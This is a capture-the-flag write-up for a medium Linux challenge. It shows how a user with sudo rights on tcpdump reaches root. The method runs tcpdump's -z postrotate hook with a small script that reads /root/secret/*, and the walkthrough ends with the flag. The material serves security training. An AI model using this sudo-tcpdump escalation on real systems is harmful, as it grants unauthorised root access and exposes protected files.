# 12 - Funny SysAdmin

## Description

Level: Medium<br/>
Author: wangibangi

Santa wrote his first small script, to track the open gifts on the wishlist. However the script stopped working a couple
of days ago and Santa has been stuck debugging the script. His sysadmin seems to be a bit funny ;)

## Solution

For this challenge, we are given a linux box with some restrictions. First, I checked the script mentioned in the
description:

```shell
santa@f5125016-5627-46be-ae27-0a3de9e4010e:/home/santa> cat santa-script.sh 
#!/bin/ash
echo "$(date)" >> /var/log/wishlist.log
curl -k https://brick-steep-tower.glitch.me/api/wishlist/items | jq .[].name >> /var/log/wishlist.log
echo "---------" >> /var/log/wishlist.log
```

Seems like we have to check out `/var/log/wishlist.log`:

```shell
cat: can't open '/var/log/wishlist.log': Permission denied
```

Okay, we need to get root access first to solve this challenge. To do this, I checked which binaries I could run with
sudo:

```shell
santa@f5125016-5627-46be-ae27-0a3de9e4010e:/home/santa> sudo -l
Matching Defaults entries for santa on f5125016-5627-46be-ae27-0a3de9e4010e:
    secure_path=/usr/foobar\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User santa may run the following commands on f5125016-5627-46be-ae27-0a3de9e4010e:
    (root) NOPASSWD: /usr/bin/less /var/log/*
    (root) NOPASSWD: !/usr/bin/less /var/log/*..*
    (root) NOPASSWD: !/usr/bin/less /var/log/* *
    (root) NOPASSWD: /usr/bin/tcpdump
```

`tcmpdump` seems to be an interesting binary that we can use to get root privileges. [And of course there's a GTFOBin
entry](https://gtfobins.github.io/gtfobins/tcpdump/). We can use the described exploit as follows:

First we write the following to a file `tmp.sh`:
```
#!/bin/sh
/bin/cat /root/secret/*
```

And then we can run:

```shell
sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./tmp.sh -Z root
```

To get the content of the secret folder: `HV22{M4k3-M3-a-S4ndW1ch}`.
